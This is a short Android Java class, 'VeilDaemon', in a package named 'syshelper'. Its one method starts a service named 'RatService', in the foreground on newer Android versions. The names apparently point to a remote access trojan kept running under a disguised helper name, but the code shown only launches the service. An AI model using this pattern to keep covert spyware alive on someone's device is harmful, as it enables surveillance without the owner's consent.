package com.syshelper.service;
import android.content.Context;
import android.content.Intent;
import android.os.Build;

public class VeilDaemon {
    public static void ensureRunning(Context ctx) {
        Intent svc = new Intent(ctx, RatService.class);
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) ctx.startForegroundService(svc);
        else ctx.startService(svc);
    }
}
